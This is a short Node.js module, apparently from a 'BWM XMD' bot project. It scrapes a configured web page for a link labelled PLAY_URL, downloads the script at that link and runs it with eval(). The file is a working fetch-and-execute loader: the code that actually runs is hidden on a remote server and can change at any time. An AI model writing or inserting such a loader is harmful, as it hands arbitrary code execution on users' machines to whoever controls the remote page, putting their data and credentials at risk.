 // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchPlayUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const playUrlElement = $('a:contains("PLAY_URL")');
    const playUrl = playUrlElement.attr('href');

    if (!playUrl) {
      throw new Error('Play URL link not found...');
    }

    console.log('Play URL fetched successfully ✅');

    const scriptResponse = await axios.get(playUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchPlayUrl();
